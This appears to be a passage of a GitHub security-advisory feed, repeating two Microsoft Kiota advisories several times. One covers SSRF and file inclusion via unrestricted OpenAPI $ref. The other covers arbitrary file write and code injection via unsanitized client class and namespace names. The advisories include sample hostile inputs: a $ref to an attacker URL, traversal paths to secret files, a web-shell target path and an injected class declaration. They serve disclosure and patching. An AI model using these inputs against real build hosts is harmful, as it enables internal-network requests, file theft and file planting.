    <entry>
        <title type="html"><![CDATA[[Microsoft.OpenApi.Kiota] Microsoft Kiota: Generation-time SSRF + remote/local file inclusion via unrestricted $ref]]></title>
        <id>https://github.com/advisories/GHSA-rg4h-fpcp-2qm8</id>
        <link href="https://github.com/advisories/GHSA-rg4h-fpcp-2qm8"/>
        <updated>2026-08-17T14:56:31.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Microsoft Kiota resolved OpenAPI <code>$ref</code>s by fetching remote <code>http(s)</code> URLs and reading local files
(including absolute / out-of-tree paths), inlining the referenced schema into the generated client.
Running <code>kiota generate</code> on a spec whose <code>$ref</code> pointed at an attacker/internal URL or an arbitrary
local file yielded SSRF, remote file inclusion, and local file inclusion. Verified on <strong>1.32.3 / 1.32.4</strong>.</p>
<h3 id="details">Details</h3>
<ul>
<li><code>$ref: http://attacker/internal-evil.json#/...</code> → build host fetches the URL (SSRF) and inlines the
remote schema (RFI); confirmed property <code>REMOTE_KIOTA_PROP</code> in the generated client.</li>
<li><code>$ref: /abs/path.json#/...</code> or <code>../../secret.json#/...</code> → Kiota reads the out-of-tree local file and
inlines its schema (LFI); confirmed <code>Leaked</code> schema in the generated client. Resolution is transitive
across nesting levels.</li>
</ul>
<p>Kiota <strong>escapes</strong> its output sinks (comments/strings/identifiers), so attacker-controlled remote/local
content cannot break out into code — no RCE. The chain stops at SSRF + RFI + LFI.</p>
<h3 id="impact">Impact</h3>
<p>Build-time SSRF (CWE-918) from the developer or CI host, disclosure of arbitrary local files (CWE-22), and
inclusion of untrusted remote content (CWE-829), from running the generator on an attacker-controlled or
attacker-influenced OpenAPI description. No code execution. Notable because Kiota is otherwise the hardened
generator (it resists the code-injection class).</p>
<p>The relevant threat is not "change the generated output" (an attacker who fully controls the description can
already do that) but the <strong>side effects on the build host</strong>: outbound requests from inside the CI network
(cloud metadata, internal-only services) and reads of local files the attacker never possessed, whose contents
are then inlined into the generated — and typically committed/published — client. It also bypasses controls
that review the description document but not externally-referenced content.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>1.29.1 and 1.32.5</strong> (<a href="https://github.com/microsoft/kiota/pull/7888">https://github.com/microsoft/kiota/pull/7888</a>). External reference resolution is now
<strong>default-deny</strong>: a new <code>AllowedExternalOriginsStreamLoader</code> refuses to load any external <code>$ref</code> — remote
<code>http(s)</code> URLs and local file paths alike — unless its origin/path is explicitly allow-listed. A new
<code>--allowed-external-origins</code> parameter (added to the commands that load OpenAPI descriptions) opts specific
origins back in, accepting <code>*</code>, full URIs, URI patterns, full paths, relative paths, or path patterns
(wildcards supported). With no allow-list entries, external references are not loaded at all.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to Kiota <strong>1.29.1, 1.32.5,</strong> or later. External references now require explicit opt-in via
<code>--allowed-external-origins</code>; add only trusted origins/paths.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/kiota/security/advisories/GHSA-rg4h-fpcp-2qm8">https://github.com/microsoft/kiota/security/advisories/GHSA-rg4h-fpcp-2qm8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59867">https://nvd.nist.gov/vuln/detail/CVE-2026-59867</a></li>
<li><a href="https://github.com/microsoft/kiota/pull/7888">https://github.com/microsoft/kiota/pull/7888</a></li>
<li><a href="https://github.com/microsoft/kiota/commit/cccd798027f0a20db796b3df6c64f9897a39d7b1">https://github.com/microsoft/kiota/commit/cccd798027f0a20db796b3df6c64f9897a39d7b1</a></li>
<li><a href="https://github.com/microsoft/kiota/releases/tag/v1.32.5">https://github.com/microsoft/kiota/releases/tag/v1.32.5</a></li>
<li><a href="https://github.com/advisories/GHSA-rg4h-fpcp-2qm8">https://github.com/advisories/GHSA-rg4h-fpcp-2qm8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rg4h-fpcp-2qm8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T16:10:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Microsoft.OpenApi.Kiota.Builder] Microsoft Kiota: Generation-time SSRF + remote/local file inclusion via unrestricted $ref]]></title>
        <id>https://github.com/advisories/GHSA-rg4h-fpcp-2qm8</id>
        <link href="https://github.com/advisories/GHSA-rg4h-fpcp-2qm8"/>
        <updated>2026-08-17T14:56:31.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Microsoft Kiota resolved OpenAPI <code>$ref</code>s by fetching remote <code>http(s)</code> URLs and reading local files
(including absolute / out-of-tree paths), inlining the referenced schema into the generated client.
Running <code>kiota generate</code> on a spec whose <code>$ref</code> pointed at an attacker/internal URL or an arbitrary
local file yielded SSRF, remote file inclusion, and local file inclusion. Verified on <strong>1.32.3 / 1.32.4</strong>.</p>
<h3 id="details">Details</h3>
<ul>
<li><code>$ref: http://attacker/internal-evil.json#/...</code> → build host fetches the URL (SSRF) and inlines the
remote schema (RFI); confirmed property <code>REMOTE_KIOTA_PROP</code> in the generated client.</li>
<li><code>$ref: /abs/path.json#/...</code> or <code>../../secret.json#/...</code> → Kiota reads the out-of-tree local file and
inlines its schema (LFI); confirmed <code>Leaked</code> schema in the generated client. Resolution is transitive
across nesting levels.</li>
</ul>
<p>Kiota <strong>escapes</strong> its output sinks (comments/strings/identifiers), so attacker-controlled remote/local
content cannot break out into code — no RCE. The chain stops at SSRF + RFI + LFI.</p>
<h3 id="impact">Impact</h3>
<p>Build-time SSRF (CWE-918) from the developer or CI host, disclosure of arbitrary local files (CWE-22), and
inclusion of untrusted remote content (CWE-829), from running the generator on an attacker-controlled or
attacker-influenced OpenAPI description. No code execution. Notable because Kiota is otherwise the hardened
generator (it resists the code-injection class).</p>
<p>The relevant threat is not "change the generated output" (an attacker who fully controls the description can
already do that) but the <strong>side effects on the build host</strong>: outbound requests from inside the CI network
(cloud metadata, internal-only services) and reads of local files the attacker never possessed, whose contents
are then inlined into the generated — and typically committed/published — client. It also bypasses controls
that review the description document but not externally-referenced content.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>1.29.1 and 1.32.5</strong> (<a href="https://github.com/microsoft/kiota/pull/7888">https://github.com/microsoft/kiota/pull/7888</a>). External reference resolution is now
<strong>default-deny</strong>: a new <code>AllowedExternalOriginsStreamLoader</code> refuses to load any external <code>$ref</code> — remote
<code>http(s)</code> URLs and local file paths alike — unless its origin/path is explicitly allow-listed. A new
<code>--allowed-external-origins</code> parameter (added to the commands that load OpenAPI descriptions) opts specific
origins back in, accepting <code>*</code>, full URIs, URI patterns, full paths, relative paths, or path patterns
(wildcards supported). With no allow-list entries, external references are not loaded at all.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to Kiota <strong>1.29.1, 1.32.5,</strong> or later. External references now require explicit opt-in via
<code>--allowed-external-origins</code>; add only trusted origins/paths.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/kiota/security/advisories/GHSA-rg4h-fpcp-2qm8">https://github.com/microsoft/kiota/security/advisories/GHSA-rg4h-fpcp-2qm8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59867">https://nvd.nist.gov/vuln/detail/CVE-2026-59867</a></li>
<li><a href="https://github.com/microsoft/kiota/pull/7888">https://github.com/microsoft/kiota/pull/7888</a></li>
<li><a href="https://github.com/microsoft/kiota/commit/cccd798027f0a20db796b3df6c64f9897a39d7b1">https://github.com/microsoft/kiota/commit/cccd798027f0a20db796b3df6c64f9897a39d7b1</a></li>
<li><a href="https://github.com/microsoft/kiota/releases/tag/v1.32.5">https://github.com/microsoft/kiota/releases/tag/v1.32.5</a></li>
<li><a href="https://github.com/advisories/GHSA-rg4h-fpcp-2qm8">https://github.com/advisories/GHSA-rg4h-fpcp-2qm8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rg4h-fpcp-2qm8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T16:10:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Microsoft.OpenApi.Kiota] Microsoft Kiota: Generation-time SSRF + remote/local file inclusion via unrestricted $ref]]></title>
        <id>https://github.com/advisories/GHSA-rg4h-fpcp-2qm8</id>
        <link href="https://github.com/advisories/GHSA-rg4h-fpcp-2qm8"/>
        <updated>2026-08-17T14:56:31.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Microsoft Kiota resolved OpenAPI <code>$ref</code>s by fetching remote <code>http(s)</code> URLs and reading local files
(including absolute / out-of-tree paths), inlining the referenced schema into the generated client.
Running <code>kiota generate</code> on a spec whose <code>$ref</code> pointed at an attacker/internal URL or an arbitrary
local file yielded SSRF, remote file inclusion, and local file inclusion. Verified on <strong>1.32.3 / 1.32.4</strong>.</p>
<h3 id="details">Details</h3>
<ul>
<li><code>$ref: http://attacker/internal-evil.json#/...</code> → build host fetches the URL (SSRF) and inlines the
remote schema (RFI); confirmed property <code>REMOTE_KIOTA_PROP</code> in the generated client.</li>
<li><code>$ref: /abs/path.json#/...</code> or <code>../../secret.json#/...</code> → Kiota reads the out-of-tree local file and
inlines its schema (LFI); confirmed <code>Leaked</code> schema in the generated client. Resolution is transitive
across nesting levels.</li>
</ul>
<p>Kiota <strong>escapes</strong> its output sinks (comments/strings/identifiers), so attacker-controlled remote/local
content cannot break out into code — no RCE. The chain stops at SSRF + RFI + LFI.</p>
<h3 id="impact">Impact</h3>
<p>Build-time SSRF (CWE-918) from the developer or CI host, disclosure of arbitrary local files (CWE-22), and
inclusion of untrusted remote content (CWE-829), from running the generator on an attacker-controlled or
attacker-influenced OpenAPI description. No code execution. Notable because Kiota is otherwise the hardened
generator (it resists the code-injection class).</p>
<p>The relevant threat is not "change the generated output" (an attacker who fully controls the description can
already do that) but the <strong>side effects on the build host</strong>: outbound requests from inside the CI network
(cloud metadata, internal-only services) and reads of local files the attacker never possessed, whose contents
are then inlined into the generated — and typically committed/published — client. It also bypasses controls
that review the description document but not externally-referenced content.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>1.29.1 and 1.32.5</strong> (<a href="https://github.com/microsoft/kiota/pull/7888">https://github.com/microsoft/kiota/pull/7888</a>). External reference resolution is now
<strong>default-deny</strong>: a new <code>AllowedExternalOriginsStreamLoader</code> refuses to load any external <code>$ref</code> — remote
<code>http(s)</code> URLs and local file paths alike — unless its origin/path is explicitly allow-listed. A new
<code>--allowed-external-origins</code> parameter (added to the commands that load OpenAPI descriptions) opts specific
origins back in, accepting <code>*</code>, full URIs, URI patterns, full paths, relative paths, or path patterns
(wildcards supported). With no allow-list entries, external references are not loaded at all.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to Kiota <strong>1.29.1, 1.32.5,</strong> or later. External references now require explicit opt-in via
<code>--allowed-external-origins</code>; add only trusted origins/paths.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/kiota/security/advisories/GHSA-rg4h-fpcp-2qm8">https://github.com/microsoft/kiota/security/advisories/GHSA-rg4h-fpcp-2qm8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59867">https://nvd.nist.gov/vuln/detail/CVE-2026-59867</a></li>
<li><a href="https://github.com/microsoft/kiota/pull/7888">https://github.com/microsoft/kiota/pull/7888</a></li>
<li><a href="https://github.com/microsoft/kiota/commit/cccd798027f0a20db796b3df6c64f9897a39d7b1">https://github.com/microsoft/kiota/commit/cccd798027f0a20db796b3df6c64f9897a39d7b1</a></li>
<li><a href="https://github.com/microsoft/kiota/releases/tag/v1.32.5">https://github.com/microsoft/kiota/releases/tag/v1.32.5</a></li>
<li><a href="https://github.com/advisories/GHSA-rg4h-fpcp-2qm8">https://github.com/advisories/GHSA-rg4h-fpcp-2qm8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rg4h-fpcp-2qm8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T16:10:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Microsoft.OpenApi.Kiota.Builder] Microsoft Kiota: Arbitrary file write + code-injection via x-ms-kiota-info clientClassName and clientNamespaceName]]></title>
        <id>https://github.com/advisories/GHSA-4vv7-jj25-4gh6</id>
        <link href="https://github.com/advisories/GHSA-4vv7-jj25-4gh6"/>
        <updated>2026-08-17T14:55:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Microsoft Kiota emitted the <code>x-ms-kiota-info</code> extension's <code>clientClassName</code> or <code>clientNamespaceName</code> value
<strong>raw</strong>, with no identifier or path sanitization, as <strong>both</strong> the generated client's class/namespace name
<strong>and</strong> part of the generated output path. When <code>kiota generate</code> is run <strong>without <code>-c/--class-name</code></strong> — the
zero-config workflow that <code>x-ms-kiota-info</code> is explicitly designed for (the API provider supplies the names in
the description so consumers don't have to) — an attacker who controls or tampers with the OpenAPI description
could therefore:</p>
<ul>
<li><strong>(CWE-22) write the generated source file to a path outside the <code>-o</code> output directory</strong> — e.g.
<code>clientClassName: "/var/www/html/shell"</code>; and</li>
<li><strong>(CWE-94) inject arbitrary text into the generated class/namespace declaration</strong>, corrupting the generated
client.</li>
</ul>
<p>Confirmed on Kiota <strong>1.32.4</strong> (the self-contained <code>linux-x64</code> release binary), i.e. <strong>after</strong> the earlier
writer-sink hardening — that fix escaped property/enum/default/serialization sinks but never sanitized the
provider-supplied <code>clientClassName</code> / <code>clientNamespaceName</code>.</p>
<h3 id="details">Details</h3>
<p><code>clientClassName</code> reached two unsanitized sinks (observed in the generated C#; the same raw emission occurred
for Java, Go, TypeScript, Python, and PHP):</p>
<pre><code># output FILENAME (CWE-22): clientClassName flows into the file path
clientClassName: "/abs/path/PWNED"   -&gt;   /abs/path/PWNED.cs   (written outside -o)

# class declaration (CWE-94): clientClassName flows verbatim into the type declaration
clientClassName: 'Pwn { } public class INJECTED { } public partial class RealClient'
   -&gt;  public partial class Pwn { } public class INJECTED { } public partial class RealClient : ... { }
</code></pre>
<p><code>clientNamespaceName</code> reached the analogous namespace/path sinks.</p>
<h3 id="impact">Impact</h3>
<p>A developer or CI host generating a client from an attacker-controlled or compromised OpenAPI description
(without <code>-c</code>) could create/overwrite a generated source file at an attacker-influenced path and emit
attacker-controlled text into the generated client.</p>
<p>This does <strong>not</strong> reach clean remote code execution: because <code>clientClassName</code> is reused verbatim at multiple
sites (the class name <strong>and</strong> the constructor name), injected code cannot be made to compile — it breaks the
build. So the code-injection vector is a generation/build-corruption (integrity/DoS), and the high-severity
primitive is the file write. CWE-22 / CWE-94.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>1.29.1 and 1.32.5</strong> (<a href="https://github.com/microsoft/kiota/pull/7884">https://github.com/microsoft/kiota/pull/7884</a>). <code>clientClassName</code> and
<code>clientNamespaceName</code> sourced from <code>x-ms-kiota-info</code> are now sanitized before use:
<code>GenerationConfiguration.SanitizeClientClassName</code> strips any character outside <code>[A-Za-z0-9_]</code> and any invalid
leading character (falling back to <code>ApiClient</code>), and <code>SanitizeClientNamespaceName</code> restricts to
<code>[A-Za-z0-9._-]</code>, collapses consecutive dots, strips invalid leading characters (falling back to <code>ApiSdk</code>).
This removes path separators, drive/colon, <code>..</code>, quotes, and braces, so the values can no longer influence
the output path or inject into the declaration.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to Kiota <strong>1.29.1, 1.32.5,</strong> or later and regenerate affected clients.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/kiota/security/advisories/GHSA-4vv7-jj25-4gh6">https://github.com/microsoft/kiota/security/advisories/GHSA-4vv7-jj25-4gh6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59866">https://nvd.nist.gov/vuln/detail/CVE-2026-59866</a></li>
<li><a href="https://github.com/microsoft/kiota/pull/7884">https://github.com/microsoft/kiota/pull/7884</a></li>
<li><a href="https://github.com/microsoft/kiota/commit/dc812dbbf88ef7edf53a890d36b2f9d1460e947d">https://github.com/microsoft/kiota/commit/dc812dbbf88ef7edf53a890d36b2f9d1460e947d</a></li>
<li><a href="https://github.com/microsoft/kiota/releases/tag/v1.32.5">https://github.com/microsoft/kiota/releases/tag/v1.32.5</a></li>
<li><a href="https://github.com/advisories/GHSA-4vv7-jj25-4gh6">https://github.com/advisories/GHSA-4vv7-jj25-4gh6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4vv7-jj25-4gh6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T16:12:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Microsoft.OpenApi.Kiota] Microsoft Kiota: Arbitrary file write + code-injection via x-ms-kiota-info clientClassName and clientNamespaceName]]></title>
        <id>https://github.com/advisories/GHSA-4vv7-jj25-4gh6</id>
        <link href="https://github.com/advisories/GHSA-4vv7-jj25-4gh6"/>
        <updated>2026-08-17T14:55:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Microsoft Kiota emitted the <code>x-ms-kiota-info</code> extension's <code>clientClassName</code> or <code>clientNamespaceName</code> value
<strong>raw</strong>, with no identifier or path sanitization, as <strong>both</strong> the generated client's class/namespace name
<strong>and</strong> part of the generated output path. When <code>kiota generate</code> is run <strong>without <code>-c/--class-name</code></strong> — the
zero-config workflow that <code>x-ms-kiota-info</code> is explicitly designed for (the API provider supplies the names in
the description so consumers don't have to) — an attacker who controls or tampers with the OpenAPI description
could therefore:</p>
<ul>
<li><strong>(CWE-22) write the generated source file to a path outside the <code>-o</code> output directory</strong> — e.g.
<code>clientClassName: "/var/www/html/shell"</code>; and</li>
<li><strong>(CWE-94) inject arbitrary text into the generated class/namespace declaration</strong>, corrupting the generated
client.</li>
</ul>
<p>Confirmed on Kiota <strong>1.32.4</strong> (the self-contained <code>linux-x64</code> release binary), i.e. <strong>after</strong> the earlier
writer-sink hardening — that fix escaped property/enum/default/serialization sinks but never sanitized the
provider-supplied <code>clientClassName</code> / <code>clientNamespaceName</code>.</p>
<h3 id="details">Details</h3>
<p><code>clientClassName</code> reached two unsanitized sinks (observed in the generated C#; the same raw emission occurred
for Java, Go, TypeScript, Python, and PHP):</p>
<pre><code># output FILENAME (CWE-22): clientClassName flows into the file path
clientClassName: "/abs/path/PWNED"   -&gt;   /abs/path/PWNED.cs   (written outside -o)

# class declaration (CWE-94): clientClassName flows verbatim into the type declaration
clientClassName: 'Pwn { } public class INJECTED { } public partial class RealClient'
   -&gt;  public partial class Pwn { } public class INJECTED { } public partial class RealClient : ... { }
</code></pre>
<p><code>clientNamespaceName</code> reached the analogous namespace/path sinks.</p>
<h3 id="impact">Impact</h3>
<p>A developer or CI host generating a client from an attacker-controlled or compromised OpenAPI description
(without <code>-c</code>) could create/overwrite a generated source file at an attacker-influenced path and emit
attacker-controlled text into the generated client.</p>
<p>This does <strong>not</strong> reach clean remote code execution: because <code>clientClassName</code> is reused verbatim at multiple
sites (the class name <strong>and</strong> the constructor name), injected code cannot be made to compile — it breaks the
build. So the code-injection vector is a generation/build-corruption (integrity/DoS), and the high-severity
primitive is the file write. CWE-22 / CWE-94.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>1.29.1 and 1.32.5</strong> (<a href="https://github.com/microsoft/kiota/pull/7884">https://github.com/microsoft/kiota/pull/7884</a>). <code>clientClassName</code> and
<code>clientNamespaceName</code> sourced from <code>x-ms-kiota-info</code> are now sanitized before use:
<code>GenerationConfiguration.SanitizeClientClassName</code> strips any character outside <code>[A-Za-z0-9_]</code> and any invalid
leading character (falling back to <code>ApiClient</code>), and <code>SanitizeClientNamespaceName</code> restricts to
<code>[A-Za-z0-9._-]</code>, collapses consecutive dots, strips invalid leading characters (falling back to <code>ApiSdk</code>).
This removes path separators, drive/colon, <code>..</code>, quotes, and braces, so the values can no longer influence
the output path or inject into the declaration.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to Kiota <strong>1.29.1, 1.32.5,</strong> or later and regenerate affected clients.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/kiota/security/advisories/GHSA-4vv7-jj25-4gh6">https://github.com/microsoft/kiota/security/advisories/GHSA-4vv7-jj25-4gh6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59866">https://nvd.nist.gov/vuln/detail/CVE-2026-59866</a></li>
<li><a href="https://github.com/microsoft/kiota/pull/7884">https://github.com/microsoft/kiota/pull/7884</a></li>
<li><a href="https://github.com/microsoft/kiota/commit/dc812dbbf88ef7edf53a890d36b2f9d1460e947d">https://github.com/microsoft/kiota/commit/dc812dbbf88ef7edf53a890d36b2f9d1460e947d</a></li>
<li><a href="https://github.com/microsoft/kiota/releases/tag/v1.32.5">https://github.com/microsoft/kiota/releases/tag/v1.32.5</a></li>
<li><a href="https://github.com/advisories/GHSA-4vv7-jj25-4gh6">https://github.com/advisories/GHSA-4vv7-jj25-4gh6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4vv7-jj25-4gh6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T16:12:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Microsoft.OpenApi.Kiota.Builder] Microsoft Kiota: Arbitrary file write + code-injection via x-ms-kiota-info clientClassName and clientNamespaceName]]></title>
        <id>https://github.com/advisories/GHSA-4vv7-jj25-4gh6</id>
        <link href="https://github.com/advisories/GHSA-4vv7-jj25-4gh6"/>
        <updated>2026-08-17T14:55:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Microsoft Kiota emitted the <code>x-ms-kiota-info</code> extension's <code>clientClassName</code> or <code>clientNamespaceName</code> value
<strong>raw</strong>, with no identifier or path sanitization, as <strong>both</strong> the generated client's class/namespace name
<strong>and</strong> part of the generated output path. When <code>kiota generate</code> is run <strong>without <code>-c/--class-name</code></strong> — the
zero-config workflow that <code>x-ms-kiota-info</code> is explicitly designed for (the API provider supplies the names in
the description so consumers don't have to) — an attacker who controls or tampers with the OpenAPI description
could therefore:</p>
<ul>
<li><strong>(CWE-22) write the generated source file to a path outside the <code>-o</code> output directory</strong> — e.g.
<code>clientClassName: "/var/www/html/shell"</code>; and</li>
<li><strong>(CWE-94) inject arbitrary text into the generated class/namespace declaration</strong>, corrupting the generated
client.</li>
</ul>
<p>Confirmed on Kiota <strong>1.32.4</strong> (the self-contained <code>linux-x64</code> release binary), i.e. <strong>after</strong> the earlier
writer-sink hardening — that fix escaped property/enum/default/serialization sinks but never sanitized the
provider-supplied <code>clientClassName</code> / <code>clientNamespaceName</code>.</p>
<h3 id="details">Details</h3>
<p><code>clientClassName</code> reached two unsanitized sinks (observed in the generated C#; the same raw emission occurred
for Java, Go, TypeScript, Python, and PHP):</p>
<pre><code># output FILENAME (CWE-22): clientClassName flows into the file path
clientClassName: "/abs/path/PWNED"   -&gt;   /abs/path/PWNED.cs   (written outside -o)

# class declaration (CWE-94): clientClassName flows verbatim into the type declaration
clientClassName: 'Pwn { } public class INJECTED { } public partial class RealClient'
   -&gt;  public partial class Pwn { } public class INJECTED { } public partial class RealClient : ... { }
</code></pre>
<p><code>clientNamespaceName</code> reached the analogous namespace/path sinks.</p>
<h3 id="impact">Impact</h3>
<p>A developer or CI host generating a client from an attacker-controlled or compromised OpenAPI description
(without <code>-c</code>) could create/overwrite a generated source file at an attacker-influenced path and emit
attacker-controlled text into the generated client.</p>
<p>This does <strong>not</strong> reach clean remote code execution: because <code>clientClassName</code> is reused verbatim at multiple
sites (the class name <strong>and</strong> the constructor name), injected code cannot be made to compile — it breaks the
build. So the code-injection vector is a generation/build-corruption (integrity/DoS), and the high-severity
primitive is the file write. CWE-22 / CWE-94.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>1.29.1 and 1.32.5</strong> (<a href="https://github.com/microsoft/kiota/pull/7884">https://github.com/microsoft/kiota/pull/7884</a>). <code>clientClassName</code> and
<code>clientNamespaceName</code> sourced from <code>x-ms-kiota-info</code> are now sanitized before use:
<code>GenerationConfiguration.SanitizeClientClassName</code> strips any character outside <code>[A-Za-z0-9_]</code> and any invalid
leading character (falling back to <code>ApiClient</code>), and <code>SanitizeClientNamespaceName</code> restricts to
<code>[A-Za-z0-9._-]</code>, collapses consecutive dots, strips invalid leading characters (falling back to <code>ApiSdk</code>).
This removes path separators, drive/colon, <code>..</code>, quotes, and braces, so the values can no longer influence
the output path or inject into the declaration.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to Kiota <strong>1.29.1, 1.32.5,</strong> or later and regenerate affected clients.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/kiota/security/advisories/GHSA-4vv7-jj25-4gh6">https://github.com/microsoft/kiota/security/advisories/GHSA-4vv7-jj25-4gh6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59866">https://nvd.nist.gov/vuln/detail/CVE-2026-59866</a></li>
<li><a href="https://github.com/microsoft/kiota/pull/7884">https://github.com/microsoft/kiota/pull/7884</a></li>
<li><a href="https://github.com/microsoft/kiota/commit/dc812dbbf88ef7edf53a890d36b2f9d1460e947d">https://github.com/microsoft/kiota/commit/dc812dbbf88ef7edf53a890d36b2f9d1460e947d</a></li>
<li><a href="https://github.com/microsoft/kiota/releases/tag/v1.32.5">https://github.com/microsoft/kiota/releases/tag/v1.32.5</a></li>
<li><a href="https://github.com/advisories/GHSA-4vv7-jj25-4gh6">https://github.com/advisories/GHSA-4vv7-jj25-4gh6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4vv7-jj25-4gh6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T16:12:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Microsoft.OpenApi.Kiota] Microsoft Kiota: Arbitrary file write + code-injection via x-ms-kiota-info clientClassName and clientNamespaceName]]></title>
        <id>https://github.com/advisories/GHSA-4vv7-jj25-4gh6</id>
        <link href="https://github.com/advisories/GHSA-4vv7-jj25-4gh6"/>
        <updated>2026-08-17T14:55:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Microsoft Kiota emitted the <code>x-ms-kiota-info</code> extension's <code>clientClassName</code> or <code>clientNamespaceName</code> value
<strong>raw</strong>, with no identifier or path sanitization, as <strong>both</strong> the generated client's class/namespace name
<strong>and</strong> part of the generated output path. When <code>kiota generate</code> is run <strong>without <code>-c/--class-name</code></strong> — the
zero-config workflow that <code>x-ms-kiota-info</code> is explicitly designed for (the API provider supplies the names in
the description so consumers don't have to) — an attacker who controls or tampers with the OpenAPI description
could therefore:</p>
<ul>
<li><strong>(CWE-22) write the generated source file to a path outside the <code>-o</code> output directory</strong> — e.g.
<code>clientClassName: "/var/www/html/shell"</code>; and</li>
<li><strong>(CWE-94) inject arbitrary text into the generated class/namespace declaration</strong>, corrupting the generated
client.</li>
</ul>
<p>Confirmed on Kiota <strong>1.32.4</strong> (the self-contained <code>linux-x64</code> release binary), i.e. <strong>after</strong> the earlier
writer-sink hardening — that fix escaped property/enum/default/serialization sinks but never sanitized the
provider-supplied <code>clientClassName</code> / <code>clientNamespaceName</code>.</p>
<h3 id="details">Details</h3>
<p><code>clientClassName</code> reached two unsanitized sinks (observed in the generated C#; the same raw emission occurred
for Java, Go, TypeScript, Python, and PHP):</p>
<pre><code># output FILENAME (CWE-22): clientClassName flows into the file path
clientClassName: "/abs/path/PWNED"   -&gt;   /abs/path/PWNED.cs   (written outside -o)

# class declaration (CWE-94): clientClassName flows verbatim into the type declaration
clientClassName: 'Pwn { } public class INJECTED { } public partial class RealClient'
   -&gt;  public partial class Pwn { } public class INJECTED { } public partial class RealClient : ... { }
</code></pre>
<p><code>clientNamespaceName</code> reached the analogous namespace/path sinks.</p>
<h3 id="impact">Impact</h3>
<p>A developer or CI host generating a client from an attacker-controlled or compromised OpenAPI description
(without <code>-c</code>) could create/overwrite a generated source file at an attacker-influenced path and emit
attacker-controlled text into the generated client.</p>
<p>This does <strong>not</strong> reach clean remote code execution: because <code>clientClassName</code> is reused verbatim at multiple
sites (the class name <strong>and</strong> the constructor name), injected code cannot be made to compile — it breaks the
build. So the code-injection vector is a generation/build-corruption (integrity/DoS), and the high-severity
primitive is the file write. CWE-22 / CWE-94.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>1.29.1 and 1.32.5</strong> (<a href="https://github.com/microsoft/kiota/pull/7884">https://github.com/microsoft/kiota/pull/7884</a>). <code>clientClassName</code> and
<code>clientNamespaceName</code> sourced from <code>x-ms-kiota-info</code> are now sanitized before use:
<code>GenerationConfiguration.SanitizeClientClassName</code> strips any character outside <code>[A-Za-z0-9_]</code> and any invalid
leading character (falling back to <code>ApiClient</code>), and <code>SanitizeClientNamespaceName</code> restricts to
<code>[A-Za-z0-9._-]</code>, collapses consecutive dots, strips invalid leading characters (falling back to <code>ApiSdk</code>).
This removes path separators, drive/colon, <code>..</code>, quotes, and braces, so the values can no longer influence
the output path or inject into the declaration.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to Kiota <strong>1.29.1, 1.32.5,</strong> or later and regenerate affected clients.</p>
